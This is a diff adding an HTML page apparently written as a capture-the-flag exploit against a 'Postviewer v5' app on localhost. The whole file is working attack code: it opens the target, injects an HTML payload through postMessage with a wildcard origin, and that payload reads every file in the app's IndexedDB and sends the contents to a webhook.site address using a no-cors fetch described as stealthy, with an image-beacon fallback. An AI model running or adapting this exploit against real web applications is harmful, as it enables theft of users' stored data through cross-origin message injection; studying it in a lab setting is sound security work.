@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Postviewer v5 exploit</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+<body>
+  <h2>Launching exploit…</h2>
+  <p>This page will automatically attempt to retrieve the admin’s flag from the Postviewer v5 instance.</p>
+  <script>
+  (async function() {
+    // change this to your own webhook URL. The flag will be POSTed there.
+    const EXFIL_URL = "https://webhook.site/90a00c64-2bf3-4683-ab13-2e3070d96349";
+
+    // This is the payload which will execute inside the victim's Postviewer page.
+    // It opens the IndexedDB, iterates through all stored files and sends
+    // their contents to EXFIL_URL.  Since the page runs inside the same
+    // origin as the vulnerable application, it has access to its DB.
+    const innerPayload = `<!doctype html><html><body><script>\n(async function() {\n  try {\n    const EXFIL='${EXFIL_URL}';\n    // Open the Files DB used by Postviewer\n    const openReq = indexedDB.open('Files', 1);\n    const db = await new Promise(resolve => { openReq.onsuccess = () => resolve(openReq.result); });\n    const tx = db.transaction('files', 'readonly').objectStore('files').getAll();\n    const records = await new Promise(resolve => { tx.onsuccess = () => resolve(tx.result); });\n    for (const rec of records) {\n      const file = rec.file;\n      const reader = new FileReader();\n      reader.onload = function() {\n        // send the file contents off-site. note: no-cors used for stealth.\n        try {\n          fetch(EXFIL, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: reader.result});\n        } catch (e) {\n          // fallback beacon via image GET if fetch fails\n          const i = new Image();\n          i.src = EXFIL + '/?data=' + encodeURIComponent(reader.result.substring(0,1024));\n        }\n      };\n      reader.readAsText(file);\n    }\n  } catch (err) {\n    console.error('exfiltration failed', err);\n  }\n})();\n<\/script></body></html>`;
+
+    // Construct a Blob from the payload.  It will be delivered as a File to the target.
+    const payloadBlob = new Blob([innerPayload], { type: 'text/html' });
+
+    // Build the object expected by the Postviewer message handler.
+    const exploitFile = { blob: payloadBlob, name: 'exploit.html', cached: false };
+
+    // Open the Postviewer homepage.  This must be the same origin as the
+    // vulnerable application for the IndexedDB to be accessible.  When the
+    // admin visits our page, the browser is still authenticated to
+    // http://localhost:1338, so we can open it again here.
+    const targetWindow = window.open('http://localhost:1338/', '_blank');
+
+    // Wait a few seconds for the page to initialise its DB and message handler.
+    await new Promise(res => setTimeout(res, 4000));
+
+    // Deliver our file via postMessage.  The handler expects an object with
+    // type 'share' and a files array.  The wildcard origin ensures delivery
+    // regardless of the exact origin.  Once received, Postviewer will add
+    // this file to its DB and immediately render it, executing our payload
+    // inside a sandboxed iframe (which still has access to IndexedDB).  The
+    // payload then reads the flag and posts it to EXFIL_URL.
+    targetWindow.postMessage({ type: 'share', files: [exploitFile] }, '*');
+  })();
+  </script>
+</body>
+</html>
